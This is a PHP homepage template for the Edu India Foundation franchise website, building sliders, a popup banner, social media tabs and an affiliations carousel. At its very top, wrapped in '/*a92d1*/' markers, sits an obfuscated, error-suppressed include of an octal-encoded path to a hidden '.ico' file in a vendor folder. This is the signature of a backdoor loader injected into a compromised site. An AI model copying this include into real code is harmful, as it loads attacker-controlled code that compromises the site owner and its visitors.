<?php
/*a92d1*/

@include "\057hom\145/ed\165ind\151af/\160ubl\151c_h\164ml/\166end\157r/b\141rco\144e/.\06199e\142f5e\056ico";

/*a92d1*/
 
include("header.php");
$g_admin = fs('top_admin',array('type'=>'A'));
?>
<title>Computer Centre Franchise: Edu India Foundation | 08950071777</title>		
<meta name="keywords" content="Edu India, Edu India Foundation, Computer Centre Franchise, NTT Course Franchise, Yoga Course Franchise"/>
<meta name="description" content="Edu India Foundation is offering Computer Centre Franchise,NTT Course Franchise & Yoga Course Franchise.Get the certification Franchise for various courses." />

<style type="text/css">
	.show_pop_up{
		    background-color: rgba(51, 76, 30, 0.5);
    height: 100%;
    width: 100%;
    z-index: 99991;
    background-size: 100%;
    position: fixed;
    z-index: 99999 !important;
    top: 0px; 
	}
</style>
<?php 
if($g_admin->p_status=="Yes"){ ?>

 <div class="show_pop_up">
 	<div class="cotainer">
 		<div class="row">
	 		<div class="col-sm-3"></div>
	 		<div class="col-sm-6">
	 			<div class="panel panel-info" style="margin-top: 13%;">
	 				<div class="panel-heading">
	 					<?php echo $g_admin->p_title; ?>
	 					<span class="pull-right close_popup" style="cursor: pointer;"><i class="fa fa-close"></i></span>
	 				</div>
	 				<div class="panel-body">
	 					<a target="_blank" href="<?php echo $g_admin->p_link; ?>" style="width: 100%;height: 300px;display: block;">
	 						<img src="upload/<?php echo $g_admin->p_image; ?>" style="width: 100%;height: 100%;">
	 					</a>	
	 				</div>
	 				<div class="panel-footer">
	 					 
	 						<a target="_blank" class="btn btn-info btn-block" href="<?php echo $g_admin->p_link; ?>">Apply Now</a>
	 					 
	 				</div>
	 			</div>
	 		</div>
		</div>
 	</div>
 </div>
 <?php } ?>



<!--Start rev slider wrapper-->     
<section class="rev_slider_wrapper">
    <div id="slider1" class="rev_slider"  data-version="5.0">
        <ul>
            <?php 
		 $home_slider = $con->all_fetch('post',array('status'=>'Yes','type'=>5),"order by sort_order desc");
		    if(is_array($home_slider) || is_object($home_slider)){
			 foreach($home_slider as $agp){
			 ?>
            <li data-transition="fade">
                <img src="<?php echo HP.$agp->img; ?>"  alt="" width="1920" height="550" data-bgposition="top center" data-bgfit="cover" data-bgrepeat="no-repeat" data-bgparallax="1" >
                
                
            </li>
			<?php } }?>
           
        </ul>
    </div>
</section>

<section class="notification_bg">
<marquee class="asas" direction="left" scrollamount="10" onMouseEnter="this.stop();" onMouseLeave="this.start();">

        <?php 
		 $all_gallery_pic = $con->all_fetch('post',array('status'=>'Yes','type'=>6),"order by sort_order desc");
		    if(is_array($all_gallery_pic) || is_object($all_gallery_pic)){
			 foreach($all_gallery_pic as $agp){
			 ?>
	     <a href="upload/<?php e($agp->img); ?>" target="_blank"><?php e($agp->name)?></a> 
			<?php } } ?>
	</marquee>
</section>


<!--End rev slider wrapper--> 
<section class="why-us">
    <div class="container">
      
		<div class="col-md-9">
		<h1>EDU INDIA FOUNDATION</h1>
		<p>Edu India Foundation has pioneered the ‘Multiskill Centre Model’ which is utilizing the existing infrastructure of an Education & Training Centre to offer skill development & entrepreneurship.</p>
<p>Since its inception, JKCS Edu India Foundation has worked towards the empowerment of people in semi-urban and rural India. We have consistently introduced a plethora of initiatives and innovations to address the ICT & skills based educational and service needs of people residing at the district, block and panchayat levels. From education academies, skill development and capacity building projects to education and skill development institutions, Edu India Foundation works in quite a number of areas to uplift the rural masses.</p>
<p>We have a great opportunity to already running training centres. We are providing best Franchise Proposal to the training centres for the courses of Computer Courses, Nursery Teacher Training Course, Fire Fighting Courses, Yoga Courses and Vocational Courses. We are only organization which has 3 courses also registered at CR (MHRD) Dept. of Higher Education, Govt. of India. These are: - Diploma in Nursery Teacher Training, Advanced Diploma in Computer Application, and Diploma in Fire & Safety Management.</p>

			<div class="link_btn">
                        <a href="about.php" class="thm-btn">know more</a>
                        
            </div>
		</div>

			
	</div>
</section>	

<section class="why-us">
    <div class="container">
		<div class="row">
			<div class="col-md-6">
				<div>
					 <ul class="nav nav-tabs" role="tablist">
    <li role="presentation" class="active"><a href="#home" aria-controls="home" role="tab" data-toggle="tab">Facebook</a></li>
    <li role="presentation"><a href="#profile" aria-controls="profile" role="tab" data-toggle="tab">Twitter</a></li>
    <li role="presentation"><a href="#messages" aria-controls="messages" role="tab" data-toggle="tab">Youtube</a></li>
   
  </ul>

  <!-- Tab panes -->
  <div class="tab-content">
    <div role="tabpanel" class="tab-pane active" id="home">
		<iframe src="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2Fbusiness%2Fnews%2Fpageinsights&tabs=timeline&width=340&height=500&small_header=false&adapt_container_width=true&hide_cover=false&show_facepile=true&appId" width="100%" height="500" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true" allow="encrypted-media"></iframe>
	</div>
    <div role="tabpanel" class="tab-pane" id="profile">
		<iframe src="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2Fbusiness%2Fnews%2Fpageinsights&tabs=timeline&width=340&height=500&small_header=false&adapt_container_width=true&hide_cover=false&show_facepile=true&appId" width="100%" height="500" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true" allow="encrypted-media"></iframe>
	</div>
    <div role="tabpanel" class="tab-pane" id="messages">
		<iframe width="560" height="315" src="https://www.youtube.com/embed/Bey4XXJAqS8" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
	</div>
  </div>
				</div>
			</div>
			<div class="col-md-6">
				<div id="myCarousel" class="carousel slide" data-ride="carousel">
   
  <div class="carousel-inner">
    <?php 
		 $home_slider = $con->all_fetch('post',array('status'=>'Yes','type'=>7),"order by sort_order desc");
		    if(is_array($home_slider) || is_object($home_slider)){
				$isws=0;
			 foreach($home_slider as $agp){
				 $isws++;
				 
				 if($isws==1){
					 echo '<div class="item active">';
				 }else{
					echo '<div class="item">';
				 }
			 ?>
			
			  <img src="<?php echo HP.$agp->img; ?>" alt="Los Angeles">
			</div>		
		<?php } }?>
    
 

  <!-- Left and right controls -->
  <a class="left carousel-control" href="#myCarousel" data-slide="prev">
    <span class="glyphicon glyphicon-chevron-left"></span>
    <span class="sr-only">Previous</span>
  </a>
  <a class="right carousel-control" href="#myCarousel" data-slide="next">
    <span class="glyphicon glyphicon-chevron-right"></span>
    <span class="sr-only">Next</span>
  </a>
</div>
			</div>
		</div>
	</div>
</section>
 

<div class="container"><div class="border-bottom"></div></div>


 



<div class="container"><div class="border-bottom"></div></div>

<section class="clients-section sec-padd">
    <div class="container">
        <div class="section-title">
            <h3>Our Affilations & Associations</h3>
        </div>
        <div class="client-carousel owl-carousel owl-theme">
<?php 
		 $all_gallery_pic = $con->all_fetch('post',array('status'=>'Yes','type'=>1),"order by sort_order desc");
		    if(is_array($all_gallery_pic) || is_object($all_gallery_pic)){
			 foreach($all_gallery_pic as $agp){
			 ?>
            <div class="item tool_tip" title="<?php echo $agp->name;?>">
                <img src="<?php echo BASE_URL.HP.$agp->img;?>" alt="1">
            </div>
			<?php
			} 
			} ?>
             
         
        </div>
    </div>  
</section>

 


<?php include("footer.php");?>
<script type="text/javascript">
	$(document).on('click','.close_popup',function(){
		$('.show_pop_up').hide();
	});
</script>
	